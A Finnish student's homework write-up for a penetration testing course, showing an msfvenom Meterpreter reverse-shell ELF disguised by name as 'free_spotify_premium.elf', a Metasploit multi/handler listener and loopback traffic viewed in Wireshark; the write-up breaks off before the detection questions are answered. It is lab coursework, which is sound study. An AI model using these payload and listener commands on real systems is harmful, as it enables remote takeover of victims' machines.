# h6 Simpukoita
Kotitehtävä h5 Syyskuu2025! Tero Karvisen Tunkeutumistestaus 2025 syksy -kurssille. [Linkki kurssisivulle](https://terokarvinen.com/tunkeutumistestaus/)
Jokaisessa kohdassa on alla olevalla "quote" tyylillä kerrottu tehtävänanto.
>Liirum laarum laa...

## Tehtävät
### a) 
> Snif Venom! Näytä esimerkki yhteydestä: reverse shell msfvenom:lla tehdystä binääristä -> metasploit multi/handler. Tarkastele yhteysttä snifferillä, kuten Wireshark. Mitä havaitset? Mistä ominaisuuksista yhteyden voi tunnistaa? Millä muutoksilla tunnistamista voi vaikeuttaa?

Aluksi tein reverse shell haittatiedoston msfvenomilla sekä vaihdoin tiedoston oikeudet.

    mdkdir msfvenom
    cd msfvenom
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > free_spotify_premium.elf

![alt text](image.png)

Tämän jälkeen avasin `msfconsolen`. Sitten asetin moduulin `use exploit/multi/handler` sekä payloadin `set payload linux/x64/meterpreter/reverse_tcp`.

![alt text](image-1.png)

Sitten vielä LHOST:n sekä LPORT:n asettaminen.

![alt text](image-2.png)

 Kaikessa tässä pitää käyttää samoja asetuksia, kuin tehdyssä haittaohjelmassa.

Nyt testataan, että toimiiko reverse shell. Suoritetaan haittaohjelma ``./free_spotify_premium.elf`` sekä suoritetaan hyökkäys metasploitissa `use`. Ja sehän onnistui. 

![alt text](image-3.png)

Avasin wiresharkin ja valitsin, että wireshark tarkastelee ``loopback: lo`` interfacea. Vaikka meterpeter vain kuuntelee, näkyy silti sen ja kohdekoneen välinen liikenne wiresharkissa. 

![alt text](image-4.png)

 
